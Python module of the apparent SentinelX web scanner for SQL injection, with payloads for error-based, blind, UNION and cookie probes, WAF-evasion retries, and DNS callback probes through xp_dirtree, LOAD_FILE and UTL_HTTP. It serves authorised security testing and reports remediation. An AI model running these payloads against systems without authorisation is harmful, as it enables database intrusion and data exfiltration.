"""SentinelX module [01]: SQL injection.

Techniques: error-based (40+ DB error signatures), boolean-blind
(TRUE/FALSE differential with 3-sample statistical confirmation),
time-blind (baseline-subtracted delay detection). Safe mode: no
destructive payloads.
"""

from __future__ import annotations

import html as _html
import re
import time
from urllib.parse import urlencode as _urlencode
from urllib.parse import quote as _quote

from sentinelx.core.http import ScanClient, ScanConfig
from sentinelx.core.models import Finding, Evidence, raw_request, raw_response
from sentinelx.core.diff import is_significant_change, diff_bodies
from sentinelx.core.encoding import apply as enc_apply
from sentinelx.core.baseline import get_baseline, adaptive_delay


DB_ERRORS = [
    # MySQL / MariaDB
    (r"SQL syntax.*MySQL", "MySQL"), (r"Warning.*mysql_.*", "MySQL"),
    (r"MySQLSyntaxErrorException", "MySQL"), (r"valid MySQL result", "MySQL"),
    (r"check the manual that (corresponds to|coresponds to) your MySQL", "MySQL"),
    # PostgreSQL
    (r"PostgreSQL.*ERROR", "PostgreSQL"), (r"Warning.*\Wpg_.*", "PostgreSQL"),
    (r"valid PostgreSQL result", "PostgreSQL"), (r"Npgsql\.", "PostgreSQL"),
    # MSSQL
    (r"Driver.* SQL[\-\_\ ]*Server", "MSSQL"),
    (r"OLE DB.* SQL Server", "MSSQL"),
    (r"(\W|\A)SQL Server.*Driver", "MSSQL"),
    (r"Warning.*mssql_.*", "MSSQL"), (r"Microsoft.*ODBC.*SQL", "MSSQL"),
    (r"Incorrect syntax near", "MSSQL"),
    # Oracle
    (r"\bORA-[0-9]{5}", "Oracle"), (r"Oracle error", "Oracle"),
    (r"Oracle.*Driver", "Oracle"), (r"Warning.*\Woci_.*", "Oracle"),
    # SQLite
    (r"SQLite/JDBCDriver", "SQLite"), (r"SQLite\.Exception", "SQLite"),
    (r"System\.Data\.SQLite", "SQLite"), (r"Warning.*sqlite_.*", "SQLite"),
    (r"sqlite3\.", "SQLite"),  # python sqlite3 module errors
    (r"\bnear\s+.+:\s*syntax error", "SQLite"),  # python: near "'": syntax error
    (r"unrecognized token", "SQLite"),  # python sqlite3: unrecognized token: "'"
    (r"no such (table|column)\b", "SQLite"),
    # Generic / others
    (r"SQLSTATE", "Generic SQL"), (r"Syntax error.*SQL", "Generic SQL"),
    (r"SQL syntax error", "Generic SQL"),  # generic labs / custom messages
    (r"database.*error.*syntax|syntax.*database.*error", "Generic SQL"),
    (r"Unclosed quotation mark", "MSSQL"),
    (r"quoted string not properly terminated", "Oracle"),
    (r"DB2 SQL error", "DB2"), (r"Sybase message", "Sybase"),
    (r"Informix", "Informix"), (r"Firebird", "Firebird"),
]
DB_ERROR_RES = [(re.compile(p, re.I), db) for p, db in DB_ERRORS]

ERROR_PAYLOADS = ["'", '"', "'\"", "`", "')", '")', "' OR '1'='1", '" OR "1"="1',
    # --- expanded: stacked queries, comment variants, type juggling ---
    "'; -- ", '"; -- ', "' OR 1=1-- -", '" OR 1=1-- -',
    "' OR 'a'='a", '" OR "a"="a', "') OR ('1'='1", '") OR ("1"="1',
    "' AND 1=CAST((SELECT version()) AS INT)-- -",
    "' UNION SELECT NULL-- -", "' UNION SELECT NULL,NULL-- -",
    "1' AND '1'='1", '1" AND "1"="1', "1') AND ('1'='1",
    "' OR SLEEP(0)-- -",  # benign timing probe (fast)
    "\\'", "\\\"",  # backslash escapes
    "'%00",  # null byte
    "'; EXEC xp_cmdshell('echo sx')-- -",  # MSSQL stacked (safe: echo only)
]

BOOLEAN_TRUE = [
    "' AND '1'='1", "' AND '1'='1' -- ", "' AND 1=1-- -",
    '" AND "1"="1', " AND 1=1", "' OR '1'='1",
    # --- expanded ---
    "' AND 1=1 AND '1'='1", '" AND 1=1 AND "1"="1',
    "' AND 'a'='a", "' OR 1=1-- -", "1' AND '1'='1' -- ",
    "') AND ('1'='1", "' AND 2>1-- -",
]
BOOLEAN_FALSE = [
    "' AND '1'='2", "' AND '1'='2' -- ", "' AND 1=2-- -",
    '" AND "1"="2', " AND 1=2", "' OR '1'='2",
    # --- expanded ---
    "' AND '1'='2' AND '1'='1", '" AND "1"="2" AND "1"="1',
    "' AND 'a'='b", "' OR 1=2-- -", "1' AND '1'='2' -- ",
    "') AND ('1'='2", "' AND 2>3-- -",
]

TIME_PAYLOADS = [
    # (dbname, payload_template, delay_scale) — delay computed adaptively
    # from baseline RTT via adaptive_delay(); templates use {d} for seconds
    ("MySQL", "' AND SLEEP({d})-- -"),
    ("MySQL", "' AND (SELECT SLEEP({d}))-- -"),
    ("PostgreSQL", "' AND pg_sleep({d})-- -"),
    ("MSSQL", "'; WAITFOR DELAY '0:0:{d}'-- -"),
    ("Oracle", "' AND DBMS_LOCK.SLEEP({d})-- -"),
]

def _order_by_tech(payloads: list, config) -> list:
    """Smart mode: order time payloads by detected tech stack.
    PHP -> MySQL first; Python/Django/Flask -> PostgreSQL/SQLite;
    ASP.NET -> MSSQL. Unknown tech: original order."""
    if not config.smart or not config.tech_stack:
        return payloads
    tech = " ".join(config.tech_stack).lower()
    priority = []
    if "php" in tech or "wordpress" in tech or "laravel" in tech:
        priority = ["MySQL", "PostgreSQL", "MSSQL", "Oracle"]
    elif "django" in tech or "flask" in tech or "python" in tech:
        priority = ["PostgreSQL", "MySQL", "Oracle", "MSSQL"]
    elif "asp.net" in tech or "iis" in tech:
        priority = ["MSSQL", "MySQL", "PostgreSQL", "Oracle"]
    elif "express" in tech or "node" in tech:
        priority = ["MySQL", "PostgreSQL", "MSSQL", "Oracle"]
    if not priority:
        return payloads
    ordered = []
    for db in priority:
        ordered.extend([p for p in payloads if p[0] == db])
    ordered.extend([p for p in payloads if p not in ordered])
    return ordered

# UNION-based extraction: marker-wrapped version functions per DBMS dialect.
UNION_MARKER = "SXV"
UNION_VERSION_TEMPLATES = [
    ("MySQL", f"CONCAT('{UNION_MARKER}',version(),'{UNION_MARKER}')"),
    ("SQLite", f"'{UNION_MARKER}'||sqlite_version()||'{UNION_MARKER}'"),
    ("MSSQL", f"('{UNION_MARKER}'+CAST(@@version AS varchar(200))+'{UNION_MARKER}')"),
    ("PostgreSQL", f"('{UNION_MARKER}'||version()||'{UNION_MARKER}')"),
    ("Oracle", f"('{UNION_MARKER}'||(SELECT banner FROM v$version WHERE rownum=1)||'{UNION_MARKER}')"),
]
UNION_MARKER_RE = re.compile(re.escape(UNION_MARKER) + r"(.{1,120}?)" + re.escape(UNION_MARKER))


def _clean_marker(text: str) -> str:
    """Return the first marker capture that looks like a rendered value,
    skipping captures from the echoed payload itself."""
    for m in UNION_MARKER_RE.finditer(text):
        g = m.group(1).strip()
        if not g:
            continue
        if any(t in g for t in ("sqlite_version", "version()", "@@version",
                                "banner", "||", "(", ")", "'", '"', ";", "--")):
            continue  # this capture is the echoed payload, not rendered output
        return g
    return ""

REMEDIATION_SQLI = (
    "Use parameterized queries / prepared statements for every database call. "
    "Never concatenate user input into SQL. Apply least-privilege DB accounts, "
    "validate and type-check input server-side, and hide detailed DB errors from users."
)


def detect_db_error(body: str) -> str | None:
    for rx, db in DB_ERROR_RES:
        if rx.search(body):
            return db
    return None


async def _send(client: ScanClient, method: str, url: str, params: dict,
                param: str, value: str, dedupe: bool = True):
    """Send request with one param replaced by value. Returns (resp, final_url, body_sent)."""
    p = dict(params); p[param] = value
    t0 = time.monotonic()
    if method == "GET":
        qs = _urlencode(p)
        full = url + ("&" if "?" in url else "?") + qs
        resp = await client.get(full, dedupe=dedupe)
        body = None
    else:
        resp = await client.post(url, data=p, dedupe=dedupe)
        full, body = url, _urlencode(p).encode()
    elapsed = time.monotonic() - t0
    return resp, full, body, elapsed


def _evidence(method, url, req_headers, body_sent, resp) -> Evidence:
    rbody = resp.content if resp else b""
    return Evidence(
        request_raw=raw_request(method, url, req_headers, body_sent),
        response_raw=raw_response(resp.status_code if resp else 0,
                                  dict(resp.headers) if resp else {}, rbody),
        proof="",
    )


async def _test_cookies(client: ScanClient, config: ScanConfig,
                        method: str, url: str, params: dict) -> list[Finding]:
    """Cookie-based SQLi (PortSwigger TrackingId pattern).

    Many labs inject via cookies, not URL params. Tests each non-session
    cookie with error-based, boolean-blind, and time-blind techniques.
    NOTE: dedupe=False everywhere — the request dedup cache key does not
    include cookies, so cached responses would mask cookie variants.
    """
    findings: list[Finding] = []
    headers = {"User-Agent": config.user_agent}
    # Collect cookie names from Set-Cookie headers (manual parse — more
    # reliable than the httpx jar, which can silently drop cookies).
    cookie_names: list[str] = []
    try:
        probe = await client.get(url, dedupe=False)
        if probe:
            # get_list for multiple Set-Cookie headers
            raw_cookies = probe.headers.get_list("set-cookie") if hasattr(
                probe.headers, "get_list") else [probe.headers.get("set-cookie", "")]
            for sc in raw_cookies:
                if not sc:
                    continue
                m = re.match(r"\s*([^=;\s]+)=", sc)
                if m and m.group(1) not in cookie_names:
                    cookie_names.append(m.group(1))
        # also merge anything the jar did capture
        jar = client._client.cookies if client._client else None
        if jar:
            for k in jar.keys():
                if k not in cookie_names:
                    cookie_names.append(k)
    except Exception:
        return findings
    if not cookie_names:
        return findings
    # map cookie name -> original value (from Set-Cookie or jar)
    orig_values: dict[str, str] = {}
    try:
        if probe:
            raw_cookies = probe.headers.get_list("set-cookie") if hasattr(
                probe.headers, "get_list") else [probe.headers.get("set-cookie", "")]
            for sc in raw_cookies:
                m = re.match(r"\s*([^=;\s]+)=([^;]*)", sc or "")
                if m:
                    orig_values[m.group(1)] = m.group(2)
        jar = client._client.cookies if client._client else None
        if jar:
            for k in jar.keys():
                try:
                    if k not in orig_values:
                        orig_values[k] = jar[k]
                except Exception:
                    pass
    except Exception:
        pass
    COOKIE_SKIP = re.compile(r"session|auth|token|csrf|_ga|_gid", re.I)
    for cname in cookie_names:
        if COOKIE_SKIP.search(cname):
            continue
        corig = orig_values.get(cname, "test123")
        if not corig or len(corig) > 500:
            continue

        async def _csend(cval: str):
            # Set directly in the jar (not per-request cookies=): httpx merges
            # per-request cookies WITH the jar, producing duplicate Cookie
            # headers where the server reads the clean value first.
            # Clear first: .set() on an existing domain cookie duplicates.
            t0 = time.monotonic()
            try:
                jar = client._client.cookies
                # remove all existing entries for this name, then set
                for _ in range(3):
                    try:
                        jar.delete(cname)
                    except Exception:
                        break
                jar.set(cname, cval)
            except Exception:
                pass
            try:
                if method == "GET":
                    qs = _urlencode(params) if params else ""
                    full = url + ("?" + qs if qs else "")
                    resp = await client.get(full, dedupe=False)
                else:
                    resp = await client.post(url, data=params or {},
                                             dedupe=False)
                    full = url
            finally:
                try:
                    jar = client._client.cookies
                    for _ in range(3):
                        try:
                            jar.delete(cname)
                        except Exception:
                            break
                    jar.set(cname, corig)
                except Exception:
                    pass
            return resp, time.monotonic() - t0, full

        # cookie baseline: 2 samples, must be stable and 200
        cb1, _, _ = await _csend(corig)
        cb2, _, _ = await _csend(corig)
        if not cb1 or not cb2 or cb1.text != cb2.text or cb1.status_code != 200:
            continue
        cbase, cbase_status = cb1.text, cb1.status_code

        # 6a. error-based via cookie
        cookie_hit = False
        for payload in ERROR_PAYLOADS[:8]:
            resp, _, cfull = await _csend(corig + payload)
            if not resp:
                continue
            db = detect_db_error(resp.text)
            if db and not detect_db_error(cbase):
                ev = _evidence(method, cfull, headers, None, resp)
                ev.proof = (f"Database error signature for {db} appeared only "
                            f"with cookie payload (cookie: {cname})")
                findings.append(Finding(
                    type="SQL Injection", subtype="error-based-cookie",
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    confidence=0.95, url=cfull, method=method, param=f"cookie:{cname}",
                    payload=payload, evidence=ev, cwe="CWE-89",
                    owasp="A03:2021 – Injection",
                    remediation=REMEDIATION_SQLI,
                    references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                ))
                cookie_hit = True
                break
        if cookie_hit:
            continue

        # 6b. boolean-blind via cookie (3 samples each)
        tb, fb = [], []
        for _ in range(3):
            rt, _, _ = await _csend(corig + BOOLEAN_TRUE[0])
            rf, _, _ = await _csend(corig + BOOLEAN_FALSE[0])
            if rt:
                tb.append(rt.text)
            if rf:
                fb.append(rf.text)
        if (len(tb) == 3 and len(fb) == 3 and len(set(tb)) == 1
                and len(set(fb)) == 1 and tb[0] != fb[0]):
            t_sig, _ = is_significant_change(cbase, tb[0], cbase_status, cbase_status)
            f_sig, _ = is_significant_change(cbase, fb[0], cbase_status, cbase_status)
            if not t_sig and f_sig:
                resp, _, cfull = await _csend(corig + BOOLEAN_TRUE[0])
                ev = _evidence(method, cfull, headers, None, resp)
                ev.proof = ("Cookie boolean-blind: TRUE payload matched baseline "
                            "(3/3), FALSE payload changed content (3/3)")
                findings.append(Finding(
                    type="SQL Injection", subtype="boolean-blind-cookie",
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    confidence=0.90, url=cfull, method=method, param=f"cookie:{cname}",
                    payload=BOOLEAN_TRUE[0], evidence=ev, cwe="CWE-89",
                    owasp="A03:2021 – Injection",
                    remediation=REMEDIATION_SQLI,
                    references=["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
                ))
                continue

        # 6c. time-blind via cookie (adaptive delay, tight bounds)
        tbl = await get_baseline(client, method, url, params)
        cdelay = adaptive_delay(tbl.avg_time if tbl else 0.3)
        d_int = int(cdelay)
        for dbname, tmpl in _order_by_tech(TIME_PAYLOADS, config)[:3]:
            payload = tmpl.format(d=d_int)
            r1, e1, cfull = await _csend(corig + payload)
            if not r1:
                continue
            _, e_ctrl, _ = await _csend(corig)
            r2, e2, _ = await _csend(corig + payload)
            if not r2:
                continue
            lo, hi = d_int * 0.8, d_int * 1.5
            if lo <= e1 <= hi and lo <= e2 <= hi and e_ctrl < d_int * 0.5:
                ev = _evidence(method, cfull, headers, None, r1)
                ev.proof = (f"Cookie time-blind: {e1:.1f}s and {e2:.1f}s delays "
                            f"with {dbname} payload (cookie: {cname})")
                findings.append(Finding(
                    type="SQL Injection", subtype="time-blind-cookie",
                    severity="critical",
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    confidence=0.85, url=cfull, method=method, param=f"cookie:{cname}",
                    payload=payload, evidence=ev, cwe="CWE-89",
                    owasp="A03:2021 – Injection",
                    remediation=REMEDIATION_SQLI,
                    references=["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
                ))
                break
    return findings


async def scan_endpoint(client: ScanClient, config: ScanConfig,
                        method: str, url: str, params: dict) -> list[Finding]:
    findings: list[Finding] = []
    # Cookie-based SQLi runs even without URL params (TrackingId pattern),
    # so the cookie tests live in _test_cookies() called at the end.
    if not params:
        findings.extend(await _test_cookies(client, config, method, url, {}))
        return findings
    headers = {"User-Agent": config.user_agent}

    for param in params:
        # ---- shared baseline (fetched once per endpoint, reused by all modules) ----
        bl = await get_baseline(client, method, url, params)
        if not bl or not bl.stable:
            continue  # unstable baseline; skip to avoid false positives
        base_body, base_status, base_time = bl.body, bl.status, bl.avg_time
        # adaptive time-blind delay scaled to measured RTT
        delay = adaptive_delay(base_time)

        # ---- 1. error-based ----
        error_hit = False
        waf_blocked = False
        for payload in ERROR_PAYLOADS:
            resp, full, body_sent, elapsed = await _send(
                client, method, url, params, param, params[param] + payload)
            if not resp:
                continue
            # track WAF blocks for conditional evasion retry
            if resp.status_code == 403 and re.search(
                    r"waf|blocked|forbidden|incapsula|cloudflare|akamai|sucuri",
                    resp.text, re.I):
                waf_blocked = True
            db = detect_db_error(resp.text)
            if db and not detect_db_error(base_body):
                ev = _evidence(method, full, headers, body_sent, resp)
                ev.proof = f"Database error signature for {db} appeared only with payload"
                findings.append(Finding(
                    type="SQL Injection", subtype="error-based",
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    confidence=0.95, url=full, method=method, param=param,
                    payload=payload, evidence=ev, cwe="CWE-89",
                    owasp="A03:2021 – Injection",
                    remediation=REMEDIATION_SQLI,
                    references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                ))
                error_hit = True
                break

        # WAF evasion: only if blocked and no hit — retry top payloads with
        # transforms (conditional, not multiplicative)
        if waf_blocked and not error_hit:
            for payload in ERROR_PAYLOADS[:4]:
                for transform in ("sql_comment", "mixed_case"):
                    evar = enc_apply(params[param] + payload, transform)
                    resp, full, body_sent, _ = await _send(
                        client, method, url, params, param, evar)
                    if not resp:
                        continue
                    db = detect_db_error(resp.text)
                    if db and not detect_db_error(base_body):
                        ev = _evidence(method, full, headers, body_sent, resp)
                        ev.proof = (f"Database error signature for {db} via WAF-evasion "
                                    f"({transform}) — WAF bypassed")
                        findings.append(Finding(
                            type="SQL Injection", subtype="error-based-waf-bypass",
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                            confidence=0.90, url=full, method=method, param=param,
                            payload=evar, evidence=ev, cwe="CWE-89",
                            owasp="A03:2021 – Injection",
                            remediation=REMEDIATION_SQLI,
                            references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                        ))
                        error_hit = True
                        break
                if error_hit:
                    break

        # ---- 2. boolean-blind: TRUE vs FALSE, 3 samples each ----
        # (skip if error-based already confirmed SQLi on this param)
        sqli_confirmed = any(f.param == param and f.type == "SQL Injection"
                             for f in findings)
        if not sqli_confirmed:
            true_bodies, false_bodies = [], []
            for _ in range(3):
                rt, full_t, _, _ = await _send(
                    client, method, url, params, param, params[param] + BOOLEAN_TRUE[0])
                rf, full_f, _, _ = await _send(
                    client, method, url, params, param, params[param] + BOOLEAN_FALSE[0])
                if rt: true_bodies.append(rt.text)
                if rf: false_bodies.append(rf.text)
            if len(true_bodies) == 3 and len(false_bodies) == 3:
                true_stable = len(set(true_bodies)) == 1
                false_stable = len(set(false_bodies)) == 1
                differ = true_bodies[0] != false_bodies[0]
                true_matches_base, _ = is_significant_change(
                    base_body, true_bodies[0], base_status, base_status)
                false_differs, _ = is_significant_change(
                    base_body, false_bodies[0], base_status, base_status)
                if true_stable and false_stable and differ and not true_matches_base and false_differs:
                    resp, full, body_sent, _ = await _send(
                        client, method, url, params, param, params[param] + BOOLEAN_TRUE[0])
                    ev = _evidence(method, full, headers, body_sent, resp)
                    ev.proof = ("TRUE payload reproduced baseline exactly (3/3 samples); "
                                "FALSE payload changed content (3/3 samples)")
                    findings.append(Finding(
                        type="SQL Injection", subtype="boolean-blind",
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        confidence=0.90, url=full, method=method, param=param,
                        payload=BOOLEAN_TRUE[0], evidence=ev, cwe="CWE-89",
                        owasp="A03:2021 – Injection",
                        remediation=REMEDIATION_SQLI,
                        references=["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
                    ))

        # ---- 3. time-blind with baseline subtraction (adaptive delay) ----
        # (skip if SQLi already confirmed on this param by cheaper techniques)
        sqli_confirmed = any(f.param == param and f.type == "SQL Injection"
                             for f in findings)
        if (config.safe_mode or True) and not sqli_confirmed:  # SLEEP is non-destructive
            # FRESH baseline: the shared baseline may be minutes old (server load
            # changes under concurrency). Measure now, right before time tests.
            fresh_bl = await get_baseline(client, method, url, params)
            if not fresh_bl or not fresh_bl.stable:
                continue
            fresh_base = fresh_bl.avg_time
            fresh_delay = adaptive_delay(fresh_base)
            for dbname, tmpl in _order_by_tech(TIME_PAYLOADS, config):
                d_int = int(fresh_delay)
                payload = tmpl.format(d=d_int)
                # sample 1: sleep payload (dedupe=False: timing must be real)
                resp, full, body_sent, elapsed = await _send(
                    client, method, url, params, param, params[param] + payload,
                    dedupe=False)
                if not resp:
                    continue
                # CONTROL: normal request interleaved (detects server slowdown)
                _, _, _, ctrl_elapsed = await _send(
                    client, method, url, params, param, params[param],
                    dedupe=False)
                # sample 2: sleep payload again (dedupe=False)
                resp2, _, _, elapsed2 = await _send(
                    client, method, url, params, param, params[param] + payload,
                    dedupe=False)
                if not resp2:
                    continue
                # STRICT: sleep samples must take ~d_int seconds; control must
                # be fast (proves the server isn't just slow right now).
                # Upper bound is TIGHT (1.5x): real pg_sleep(d) is precise;
                # server slowness under load is random and won't hit [0.8d, 1.5d]
                # twice with a fast control in between.
                lo, hi = d_int * 0.8, d_int * 1.5
                if (lo <= elapsed <= hi and lo <= elapsed2 <= hi
                        and ctrl_elapsed < d_int * 0.5
                        and fresh_base < d_int * 0.5):
                    ev = _evidence(method, full, headers, body_sent, resp)
                    ev.proof = (f"Response delayed {elapsed:.1f}s and {elapsed2:.1f}s "
                                f"(baseline {base_time:.2f}s) with {dbname} time payload")
                    findings.append(Finding(
                        type="SQL Injection", subtype="time-blind",
                        severity="critical",
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        confidence=0.85, url=full, method=method, param=param,
                        payload=payload, evidence=ev, cwe="CWE-89",
                        owasp="A03:2021 – Injection",
                        remediation=REMEDIATION_SQLI,
                        references=["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
                    ))
                    break

        # ---- 4. DNS OOB (third confirmation channel, needs --oob-domain) ----
        # Only fires when the user supplied a callback domain. Uses DBMS-specific
        # DNS exfiltration functions. We can't observe the DNS hit from here,
        # so this is a "likely" signal — reported at lower confidence and only
        # if no other SQLi was confirmed on this param (avoids noise).
        sqli_confirmed = any(f.param == param and f.type == "SQL Injection"
                             for f in findings)
        if config.oob_domain and not sqli_confirmed:
            import secrets as _secrets
            token = _secrets.token_hex(4)
            oob_target = f"{token}.{config.oob_domain}"
            OOB_PAYLOADS = [
                # MySQL: LOAD_FILE triggers DNS via UNC/SMB or DNS lookup
                f"' AND LOAD_FILE(CONCAT('\\\\\\\\',{_quote(oob_target)},'\\\\a'))-- -",
                # PostgreSQL: dblink / COPY TO PROGRAM variants (safe: DNS only)
                f"'; SELECT dblink_connect('host={oob_target} user=a password=a dbname=a')-- -",
                # MSSQL: xp_dirtree triggers DNS/SMB lookup
                f"'; EXEC xp_dirtree '\\\\{oob_target}\\a'-- -",
                # Oracle: UTL_HTTP / DBMS_LDAP
                f"' AND UTL_HTTP.REQUEST('http://{oob_target}/') IS NOT NULL-- -",
            ]
            for payload in OOB_PAYLOADS:
                resp, full, body_sent, _ = await _send(
                    client, method, url, params, param, params[param] + payload)
                if not resp:
                    continue
                # OOB is a "shot in the dark" — we report it as a lead only if
                # the response differs from baseline (error or timing change),
                # which suggests the DB attempted the lookup
                db_err = detect_db_error(resp.text) and not detect_db_error(base_body)
                if db_err:
                    ev = _evidence(method, full, headers, body_sent, resp)
                    ev.proof = (f"DNS-OOB payload triggered a DB error — the database "
                                f"attempted to resolve {oob_target}. Check your DNS logs "
                                f"for '{token}' to confirm exfiltration.")
                    findings.append(Finding(
                        type="SQL Injection", subtype="dns-oob-lead",
                        cvss_vector="CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        confidence=0.65, url=full, method=method, param=param,
                        payload=payload, evidence=ev, cwe="CWE-89",
                        owasp="A03:2021 – Injection",
                        remediation=REMEDIATION_SQLI,
                        references=["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
                    ))
                    break

        # ---- 5. UNION-based ----
        def _norm(body: str, sent_value: str) -> str:
            variants = {
                sent_value,
                _html.escape(sent_value),
                (sent_value.replace("&", "&#38;").replace("'", "&#39;")
                 .replace('"', "&#34;").replace("<", "&#60;").replace(">", "&#62;")),
                _quote(sent_value, safe=""),
            }
            for v in variants:
                if v:
                    body = body.replace(v, "SXNORM")
            return body

        col_count, ctx_quote = 0, ""
        for q in ("'", ""):
            v1 = params[param] + f"{q} ORDER BY 1-- -"
            r1, _, _, _ = await _send(client, method, url, params, param, v1)
            if not r1:
                break
            if detect_db_error(r1.text) and not detect_db_error(base_body):
                continue  # wrong context: ORDER BY 1 must not error
            n1 = _norm(r1.text, v1)
            found = 0
            for n in range(2, 11):
                vn = params[param] + f"{q} ORDER BY {n}-- -"
                rn, _, _, _ = await _send(client, method, url, params, param, vn)
                if not rn:
                    break
                db_err = bool(detect_db_error(rn.text)) and not detect_db_error(r1.text)
                status_flip = rn.status_code != r1.status_code
                sim, _ = diff_bodies(n1, _norm(rn.text, vn))
                if db_err or status_flip or sim < 0.60:
                    found = n - 1
                    break
            else:
                continue  # all ORDER BYs behaved like 1 — wrong context, try next
            if found >= 1:
                col_count, ctx_quote = found, q
                break
        if col_count >= 1:
            nulls = ",".join(["NULL"] * col_count)
            # Straight to marker-based extraction: a reflected SXV<version>SXV
            # marker is definitive proof of UNION injection (no NULL-probe gate,
            # because app-layer error handlers can mask a working UNION point).
            db_version, dbms = "", ""
            union_full, union_body_sent, union_resp = "", None, None
            for i in range(min(col_count, 5)):
                if db_version:
                    break
                for dbname, template in UNION_VERSION_TEMPLATES:
                    cols = ["NULL"] * col_count
                    cols[i] = template
                    suffix = f"{ctx_quote} UNION SELECT {','.join(cols)}-- -"
                    for variant in (suffix, enc_apply(suffix, "sql_comment")):
                        resp, full, body_sent, _ = await _send(
                            client, method, url, params, param,
                            params[param] + variant)
                        if not resp:
                            continue
                        hit = _clean_marker(resp.text)
                        if hit:
                            db_version, dbms = hit, dbname
                            union_full, union_body_sent = full, body_sent
                            # re-fetch clean evidence for the report
                            union_resp = resp
                            break
                    if db_version:
                        break
            if db_version:
                ev = _evidence(method, union_full, headers, union_body_sent, union_resp)
                ev.proof = (
                    f"ORDER BY probe: column count = {col_count}; "
                    f"UNION SELECT injected and rendered server-side; "
                    f"extracted database version '{db_version}' ({dbms}) via marker reflection"
                )
                findings.append(Finding(
                    type="SQL Injection", subtype="union-based",
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    confidence=0.93, url=union_full, method=method, param=param,
                    payload=f"{ctx_quote} UNION SELECT {nulls}-- -", evidence=ev, cwe="CWE-89",
                    owasp="A03:2021 – Injection",
                    remediation=REMEDIATION_SQLI,
                    references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                ))
    # ---- 6. cookie-based SQLi (TrackingId pattern) ----
    findings.extend(await _test_cookies(client, config, method, url, params or {}))
    return findings
